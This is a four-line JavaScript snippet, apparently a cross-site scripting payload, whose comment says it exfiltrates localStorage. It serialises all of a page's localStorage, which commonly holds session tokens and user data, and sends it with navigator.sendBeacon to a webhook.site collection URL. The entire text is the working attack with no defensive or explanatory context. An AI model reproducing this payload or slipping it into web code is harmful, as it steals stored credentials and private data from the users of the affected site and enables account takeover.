// Exfiltrate localStorage to webhook via POST (no size limit)
var w = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50';
var d = JSON.stringify(localStorage);
navigator.sendBeacon(w, d);
